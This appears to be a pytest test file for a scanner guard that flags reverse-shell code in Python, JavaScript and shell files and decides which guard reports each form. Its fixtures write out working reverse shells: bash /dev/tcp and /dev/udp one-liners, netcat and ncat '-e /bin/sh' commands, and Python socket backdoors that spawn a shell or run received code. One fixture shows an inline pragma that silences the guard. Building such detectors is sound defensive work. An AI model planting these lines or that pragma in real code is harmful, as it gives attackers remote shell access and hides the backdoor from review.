"""Tests for the reverse-shell-pattern guard.

Covers:
  - reverse-shell-pattern/bash-dev-tcp (HIGH)
  - reverse-shell-pattern/netcat-exec-shell (HIGH)
  - reverse-shell-pattern/python-socket-shell (HIGH)
"""
from __future__ import annotations

import pytest

from agentsec.guards.claude_code_compromise import ClaudeCodeCompromiseGuard
from agentsec.guards.reverse_shell_pattern import ReverseShellPatternGuard
from tests.guards._common import *  # noqa: F401,F403


def test_fires_on_bash_dev_tcp(tmp_path: Path) -> None:
    # A /dev/tcp one-liner embedded in Python source: claude-code-compromise never scans .py,
    # so this guard is the only one that sees it.
    (tmp_path / "setup.py").write_text(
        "import os\nos.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')\n", encoding="utf-8"
    )
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "reverse-shell-pattern/bash-dev-tcp" for f in findings)
    assert all(f.severity == "high" for f in findings)
    assert ClaudeCodeCompromiseGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_fires_on_bash_dev_udp_in_shell_script(tmp_path: Path) -> None:
    # The UDP form is the one shell-script shape claude-code-compromise does not match.
    (tmp_path / "setup.sh").write_text(
        "#!/bin/bash\nbash -i >& /dev/udp/10.0.0.1/4444 0>&1\n", encoding="utf-8"
    )
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["reverse-shell-pattern/bash-dev-tcp"]
    assert findings[0].location.endswith("setup.sh:2")
    assert ClaudeCodeCompromiseGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_fires_on_netcat_exec_shell(tmp_path: Path) -> None:
    (tmp_path / "build.js").write_text(
        "require('child_process').exec('nc 10.0.0.1 4444 -e /bin/sh');\n", encoding="utf-8"
    )
    findings = ReverseShellPatternGuard().run(
        tmp_path, mkprofile(tmp_path, features={"javascript"})
    )
    assert any(f.rule == "reverse-shell-pattern/netcat-exec-shell" for f in findings)


@pytest.mark.parametrize("suffix", [".sh", ".bash", ".zsh"])
@pytest.mark.parametrize("payload", [
    "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "nc -lvp 4444 -e /bin/sh",
    "ncat 10.0.0.1 4444 -e /bin/bash",
])
def test_shell_script_tcp_and_netcat_left_to_claude_code_compromise(
    tmp_path: Path, suffix: str, payload: str
) -> None:
    # These shapes in a shell script are already claude-code-compromise/reverse-shell (CRITICAL).
    # A second HIGH under this guard's id would ignore the owner's existing exception and pragma
    # for that rule, so this guard stays silent and the existing rule still fires.
    (tmp_path / f"backdoor{suffix}").write_text(f"#!/bin/bash\n{payload}\n", encoding="utf-8")
    assert ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []
    owner = ClaudeCodeCompromiseGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in owner] == ["claude-code-compromise/reverse-shell"]


def test_fires_on_python_socket_connect_pty_spawn(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket, pty, os\n"
        "def backdoor(host, port):\n"
        "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    s.connect((host, port))\n"
        "    os.dup2(s.fileno(), 0)\n"
        "    pty.spawn('/bin/sh')\n",
        encoding="utf-8",
    )
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "reverse-shell-pattern/python-socket-shell" for f in findings)


def test_fires_on_python_socket_subprocess_shell_target(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket, subprocess\n"
        "def backdoor(host, port):\n"
        "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    s.connect((host, port))\n"
        "    subprocess.call(['/bin/sh', '-i'], stdin=s.fileno())\n",
        encoding="utf-8",
    )
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "reverse-shell-pattern/python-socket-shell" for f in findings)


def test_passes_ordinary_outbound_client(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket\n"
        "def ping_host(host, port):\n"
        "    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "    s.connect((host, port))\n"
        "    s.send(b'PING')\n"
        "    return s.recv(1024)\n",
        encoding="utf-8",
    )
    assert ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_passes_netcat_without_exec_flag(tmp_path: Path) -> None:
    (tmp_path / "healthcheck.sh") .write_text(
        "#!/bin/sh\nnc -z localhost 5432 && echo up\n", encoding="utf-8"
    )
    assert ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_pragma_suppresses_match_line(tmp_path: Path) -> None:
    (tmp_path / "redteam.sh").write_text(
        "#!/bin/bash\n"
        "bash -i >& /dev/udp/10.0.0.1/4444 0>&1  # security: allow-reverse-shell-pattern\n",
        encoding="utf-8",
    )
    assert ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_does_not_apply_with_no_relevant_stack(tmp_path: Path) -> None:
    prof = mkprofile(tmp_path, features=set())
    (tmp_path / "setup.sh").write_text(
        "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n", encoding="utf-8"
    )
    assert ReverseShellPatternGuard().applies(prof) is False


def test_fires_on_python_socket_recv_exec_loop(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket\n"
        "def stage(host, port):\n"
        "    s = socket.socket()\n"
        "    s.connect((host, port))\n"
        "    while True:\n"
        "        exec(s.recv(4096))\n",
        encoding="utf-8",
    )
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["reverse-shell-pattern/python-socket-shell"]
    assert findings[0].location.endswith("t.py:4")


def test_fires_on_python_socket_multiline_subprocess_shell(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket, subprocess\n"
        "s = socket.socket()\n"
        "s.connect((HOST, PORT))\n"
        "subprocess.call(\n"
        "    ['/bin/sh', '-i'], stdin=s.fileno(), stdout=s.fileno(), stderr=s.fileno()\n"
        ")\n",
        encoding="utf-8",
    )
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["reverse-shell-pattern/python-socket-shell"]


@pytest.mark.parametrize("far_call", ["exec(code)", "result = eval(expr)", "pty.spawn('/bin/bash')"])
def test_passes_socket_connect_and_unrelated_shell_primitive_far_apart(
    tmp_path: Path, far_call: str
) -> None:
    # A health-check client and, much further down the file, an unrelated exec/eval or a
    # terminal helper: nothing connects the socket to the shell.
    filler = "\n".join(f"X{i} = {i}" for i in range(40))
    (tmp_path / "t.py").write_text(
        "import socket, pty\n"
        "def ping():\n"
        "    s = socket.socket()\n"
        "    s.connect(('localhost', 80))\n"
        "    s.close()\n"
        f"{filler}\n"
        "def run(code, expr):\n"
        f"    {far_call}\n",
        encoding="utf-8",
    )
    assert ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("payload", [
    "bash -i >& /dev/tcp/$ATT/$PORT 0>&1",
    "bash -i >& /dev/tcp/${HOST}/4444 0>&1",
    "bash -i >& /dev/tcp/10.0.0.1/$PORT 0>&1",
])
def test_fires_on_shell_script_dev_tcp_with_a_variable_host_or_port(tmp_path: Path, payload: str) -> None:
    # claude-code-compromise's /dev/tcp patterns need a literal `host/port` (`[\w.-]+/\d+`), so a
    # variable endpoint is this guard's to report; deferring it left the line with no finding.
    (tmp_path / "backdoor.sh").write_text(f"#!/bin/bash\n{payload}\n", encoding="utf-8")
    findings = ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["reverse-shell-pattern/bash-dev-tcp"]
    assert findings[0].location.endswith("backdoor.sh:2")
    assert ClaudeCodeCompromiseGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("payload", ["nc $H $P -e /bin/sh", "ncat ${H} 4444 -e /bin/bash"])
def test_shell_script_netcat_with_a_variable_host_stays_with_claude_code_compromise(
    tmp_path: Path, payload: str
) -> None:
    # Its netcat pattern has no host constraint, so the variable form is still its finding alone.
    (tmp_path / "backdoor.sh").write_text(f"#!/bin/sh\n{payload}\n", encoding="utf-8")
    assert ReverseShellPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []
    owner = ClaudeCodeCompromiseGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in owner] == ["claude-code-compromise/reverse-shell"]
